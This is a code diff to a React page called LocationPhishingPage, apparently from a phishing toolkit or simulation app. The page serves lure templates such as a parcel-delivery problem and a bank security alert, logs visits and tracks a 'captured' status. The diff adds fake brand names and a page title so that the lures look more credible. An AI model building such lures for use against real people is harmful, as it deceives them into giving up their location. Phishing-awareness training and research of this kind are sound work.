@@ -8,7 +8,7 @@ import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
-import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck } from 'lucide-react';
+import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck, Globe } from 'lucide-react';
 
 interface TemplateContent {
   title: string;
@@ -75,6 +75,12 @@ export default function LocationPhishingPage() {
     addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [templateId]);
+
+  useEffect(() => {
+    if (content.title) {
+      document.title = content.title;
+    }
+  }, [content.title]);
 
   useEffect(() => {
     if (status === 'captured') {
@@ -148,6 +154,10 @@ export default function LocationPhishingPage() {
       case 'package-delivery-issue': {
         return (
           <div className="space-y-6 text-center">
+            <div className="mb-6">
+              <h2 className="text-2xl font-bold text-gray-700 dark:text-gray-300">Global Swift Logistics</h2>
+              <p className="text-sm text-muted-foreground">Your Trusted Delivery Partner</p>
+            </div>
             <HeroIcon className="w-20 h-20 text-primary mx-auto mb-4" />
             <p className="text-xl text-muted-foreground leading-relaxed">
               {content.message}
@@ -182,11 +192,14 @@ export default function LocationPhishingPage() {
         const CurrentHeroIcon = content.heroIcon || ShieldAlert;
         return (
           <Alert variant="destructive" className="mb-6 text-left p-6 shadow-xl border-2 border-destructive-foreground/30">
-            <div className="flex items-center mb-4">
-              <CurrentHeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0" />
-              <AlertTitle className="text-3xl font-bold text-destructive">
-                {content.message}
-              </AlertTitle>
+            <div className="flex items-start mb-4"> {/* Changed to items-start for better alignment with subtitle */}
+              <CurrentHeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0 mt-1" />
+              <div>
+                <h3 className="text-sm font-semibold text-destructive/80 -mb-1">SecureNet Financial</h3>
+                <AlertTitle className="text-3xl font-bold text-destructive">
+                  {content.message}
+                </AlertTitle>
+              </div>
             </div>
             <AlertDescription className="space-y-4">
               <p className="text-md leading-relaxed text-destructive/90">
@@ -214,6 +227,10 @@ export default function LocationPhishingPage() {
               <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
               <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
+              <div className="pt-3 flex items-center justify-center text-sm text-muted-foreground/80">
+                <Globe className="h-4 w-4 mr-1.5" />
+                Powered by GeoUnlock&trade;
+              </div>
             </CardContent>
           </ShadcnCard>
         );
